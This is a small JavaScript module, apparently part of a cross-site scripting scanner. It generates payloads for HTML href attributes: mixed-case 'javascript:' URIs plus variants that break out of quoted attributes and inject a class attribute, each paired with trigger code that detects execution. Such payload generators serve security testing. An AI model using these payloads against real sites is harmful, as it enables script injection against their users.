const {getTriggerCodeForClass, getTriggerCodeForCode} = require('./generators');
const htmlNormalAttributePayloads = require('./htmlNormalAttributePayloads');

function htmlHrefAttributePayloads(data) {
    const {jsCode, tagClass} = data;
    const exitStrings = ['"', "'", ''];
    return [
        {
            payload: `JAvaSCriPt:void(${jsCode})`,
            trigger: getTriggerCodeForCode(jsCode),
        },
        ...exitStrings.map(exit => ({
            payload: `JAvaSCriPt:void(${jsCode})${exit} class=${tagClass}/${exit}`,
            trigger: getTriggerCodeForClass(tagClass, 'click'),
        })),
        ...htmlNormalAttributePayloads(data)
    ];
}

module.exports = htmlHrefAttributePayloads;
